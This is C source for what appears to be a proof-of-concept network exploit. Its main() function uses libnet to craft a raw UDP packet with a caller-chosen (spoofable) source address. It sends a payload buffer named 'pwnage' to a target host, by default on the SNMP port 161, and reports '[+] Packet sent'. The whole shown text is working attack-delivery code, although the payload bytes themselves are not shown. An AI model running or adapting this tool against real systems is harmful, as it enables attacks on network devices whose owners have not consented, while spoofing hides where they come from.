int main(int argc, char **argv)
{
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l;
    int c;
    u_char *buf;
    int packet_len = 0;
    struct ip *IP;
    struct udphdr *UDP;
    u_int32_t src = 0, dst = 0;


    banner();

    if (argc < 3) usage(argv[0]);

    if ((l = libnet_init(LIBNET_RAW4, NULL, errbuf)) == NULL) {
        fprintf(stderr, "[!] libnet_init() failed: %s", errbuf);
        exit(-1);
    }

    if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
        fprintf(stderr, "[!] Unresolved source address.\n");
        exit(-1);
    }
    if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
        fprintf(stderr, "[!] Unresolved destination address.\n");
        exit(-1);
    }

    if ((buf = malloc(IP_MAXPACKET)) == NULL) {
        perror("malloc");
        exit(-1);
    }

    UDP = (struct udphdr *)(buf + LIBNET_IPV4_H);

    packet_len = LIBNET_IPV4_H + LIBNET_UDP_H + sizeof(pwnage) - 1;

    srand(time(NULL));
    IP = (struct ip *) buf;
    IP->ip_v    = 4;                   /* version 4 */
    IP->ip_hl   = 5;		     /* header length */
    IP->ip_tos  = 0;                   /* IP tos */
    IP->ip_len  = htons(packet_len);   /* total length */
    IP->ip_id   = rand();              /* IP ID */
    IP->ip_off  = htons(0);            /* fragmentation flags */
    IP->ip_ttl  = 64;                  /* time to live */
    IP->ip_p    = IPPROTO_UDP;         /* transport protocol */
    IP->ip_sum  = 0;
    IP->ip_src.s_addr = src;
    IP->ip_dst.s_addr = dst;

    UDP->uh_sport = rand();
    UDP->uh_dport = (argc > 3) ? htons((u_short)atoi(argv[3])) : htons(161);
    UDP->uh_ulen = htons(LIBNET_UDP_H + sizeof(pwnage) - 1);
    UDP->uh_sum = 0;

    memcpy(buf + LIBNET_IPV4_H + LIBNET_UDP_H, pwnage, sizeof(pwnage) - 1);

    libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_UDP, packet_len - LIBNET_IPV4_H);

    if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
    {
        fprintf(stderr, "[!] Write error: %s\n", libnet_geterror(l));
        exit(-1);
    }

    printf("[+] Packet sent.\n");

    libnet_destroy(l);
    free(buf);
    return (0);
}